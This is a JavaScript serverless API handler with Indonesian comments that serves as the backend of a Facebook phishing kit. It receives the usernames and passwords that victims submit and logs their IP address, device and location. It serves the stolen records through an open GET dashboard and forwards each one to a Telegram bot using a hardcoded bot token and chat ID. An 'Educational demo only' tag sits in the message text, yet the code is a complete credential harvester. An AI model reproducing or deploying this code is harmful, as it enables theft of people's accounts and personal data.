// API Handler - Capture credentials & kirim ke Telegram
export default async function handler(req, res) {
    // CORS
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

    if (req.method === 'OPTIONS') {
        return res.status(200).end();
    }

    // GET = Dashboard data
    if (req.method === 'GET') {
        const captures = global.captures || [];
        return res.status(200).json({
            status: "active",
            total: captures.length,
            captures: captures.slice(0, 50),
            timestamp: new Date().toISOString()
        });
    }

    // POST = Capture credentials
    if (req.method === 'POST') {
        const { username, password, target } = req.body;

        const capture = {
            id: Date.now(),
            target: target || "Facebook",
            username: username || "",
            password: password || "",
            ip: req.headers['x-forwarded-for'] || req.socket.remoteAddress || "Unknown",
            userAgent: req.headers['user-agent'] || "",
            timestamp: new Date().toISOString(),
            country: req.headers['x-vercel-ip-country'] || "Unknown",
            city: req.headers['x-vercel-ip-city'] || "Unknown",
        };

        // Simpan
        if (!global.captures) global.captures = [];
        global.captures.unshift(capture);
        if (global.captures.length > 100) global.captures.pop();

        // Kirim ke Telegram
        await sendTelegram(capture);

        return res.status(200).json({
            success: true,
            message: "Captured successfully"
        });
    }

    return res.status(405).json({ error: "Method not allowed" });
}

// Telegram sender
async function sendTelegram(data) {
    const TOKEN = "8747905662:AAFle9Yav38swilXQFDrvmXoKWdCjTnCCSI";
    const CHAT_ID = "8121118375";

    const emoji = "🎣";
    const msg = `
${emoji} <b>NEW FACEBOOK CAPTURE!</b>

👤 <b>Username:</b> ${data.username}
🔑 <b>Password:</b> ${data.password}
🌐 <b>IP:</b> ${data.ip}
📍 <b>Location:</b> ${data.city}, ${data.country}
📱 <b>Device:</b> ${data.userAgent.substring(0, 100)}
⏰ <b>Time:</b> ${data.timestamp}

⚠️ <i>Educational demo only!</i>
    `.trim();

    try {
        await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: CHAT_ID,
                text: msg,
                parse_mode: "HTML"
            })
        });
    } catch (e) {
        console.error("Telegram error:", e.message);
    }
            }
